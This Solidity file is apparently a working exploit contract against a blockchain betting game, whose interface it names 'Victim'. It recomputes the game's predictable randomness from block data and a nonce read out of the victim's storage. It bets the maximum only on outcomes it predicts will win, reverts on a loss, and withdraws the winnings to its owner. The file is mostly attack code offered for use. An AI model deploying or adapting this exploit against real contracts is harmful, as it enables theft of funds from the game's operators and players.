1 contract Victim {
2     function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId);
3 }
4 
5 
6 contract BetWinner {
7     uint randonce;
8 	address payable owner;
9 	Victim victim;
10 	
11 	constructor(Victim v) public {
12 		owner = msg.sender;
13 		victim = v;
14 	}
15 	
16 	function () payable external {
17 	}
18 
19 	modifier onlyOwner() {
20 		require(msg.sender == owner);
21 		_;
22 	}
23 	
24 	//
25 	// w3.eth.getStorageAt("0x77F54E6a0ED49e8Ce5155468FeAEC29368B10465",7)
26 	//
27 	function setNonce(uint nonce) external onlyOwner {
28 		randonce = nonce;
29 	}
30 	
31 	function getMaxBet() public view onlyOwner returns (uint) {
32 	    return address(victim).balance * 80 / 100 * 10 / 19 - 1000;
33 	}
34 	
35 	function  doBet(uint weiValOverride) payable external onlyOwner {
36 	    uint weiVal = weiValOverride;
37 	    if (weiVal == 0) {
38 	        weiVal = getMaxBet();
39 	    }
40 		
41 		uint before = address(this).balance;
42 		
43 	    (uint betInfo, uint randonceNew) = getBet(randonce);
44 		
45 		if (betInfo != 2) {
46 			// call victim
47 			uint[] memory playid = new uint[](1);
48 			playid[0] = betInfo;
49 			
50 			uint[] memory betMoney = new uint[](1);
51 			betMoney[0] = weiVal;
52 			
53 			uint[] memory betContent = new uint[](1);
54 			betContent[0] = betInfo;
55 			victim.doBet.value(weiVal)(playid, betMoney, betContent,1);
56 			
57 			uint post = address(this).balance;
58 			require(before < post, "Sanity check");
59     	    randonce = randonceNew;
60 		}
61 
62 	}
63 	
64     function getBet(uint randonce) public view onlyOwner returns (uint betInfo, uint randonceNew)  {
65 		uint[4] memory codes = [uint(0),0,0,0];//Winning numbers
66 
67 		bytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
68 		randonce  = randonce + uint(code0hash)%1000;
69 		codes[0] = uint(code0hash) % 52 + 1;
70 
71 		bytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
72 		randonce  = randonce + uint(code1hash)%1000;
73 		codes[1] = uint(code1hash) % 52 + 1;
74 
75 		bytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
76 		randonce  = randonce + uint(code2hash)%1000;
77 		codes[2] = uint(code2hash) % 52 + 1;
78 
79 		bytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
80 		randonce  = randonce + uint(code3hash)%1000;
81 		codes[3] = uint(code3hash) % 52 + 1;
82 
83 		// check winner
84 		uint code0 = codes[0]%13==0?13:codes[0]%13;
85 		uint code1 = codes[1]%13==0?13:codes[1]%13;
86 		uint code2 = codes[2]%13==0?13:codes[2]%13;
87 		uint code3 = codes[3]%13==0?13:codes[3]%13;
88 		uint  onecount = code0 + code2;
89 		uint  twocount = code1 + code3;
90 		onecount = onecount%10;
91 		twocount = twocount%10;
92 		  
93 		betInfo = 2;
94 		if(onecount > twocount){
95 			betInfo = 1;
96 		} else if (onecount < twocount){
97 			betInfo = 3;
98 		}
99 		return (betInfo, randonce);
100     }
101 	
102 	function withdraw() external onlyOwner{
103 		owner.transfer((address(this).balance));
104 	}
105 
106 
107 }